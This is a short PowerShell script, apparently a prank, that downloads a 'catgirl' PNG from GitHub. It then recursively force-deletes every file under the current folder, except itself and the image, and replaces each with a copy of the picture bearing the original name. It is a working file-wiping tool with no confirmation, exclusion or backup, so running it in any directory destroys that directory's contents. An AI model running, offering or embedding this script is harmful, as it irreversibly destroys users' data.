$targetFolder = gl
$webImage = "https://github.com/Hortonk223/catgirl-supremacy/blob/main/catgirl.png?raw=true"
$downloadedImage = "$targetFolder\catgirl.png"
$scriptName = $MyInvocation.MyCommand.Name
Write-Output $scriptName $downloadedImage
# Download image
Invoke-WebRequest -Uri $webImage -OutFile $downloadedImage -Verbose

# Replace each file with the image while keeping the same name
Get-ChildItem -Path $targetFolder -File -Recurse | Where-Object { $_.Name -ne $scriptName -and $_.Name -ne "catgirl.png"} | ForEach-Object {
    if (Test-Path $downloadedImage)
    {
        Write-Output "Replacing $_ with a catgirl"
        Remove-Item -Path $_.FullName -Force  # Delete original file
        $newFileName = "$($_.DirectoryName)\$($_.BaseName).png"
        Copy-Item -Path $downloadedImage -Destination $newFileName -Force  # Replace with image
    }
    else 
    {
        Write-Output "Image didn't download correctly :("
        break
    }
}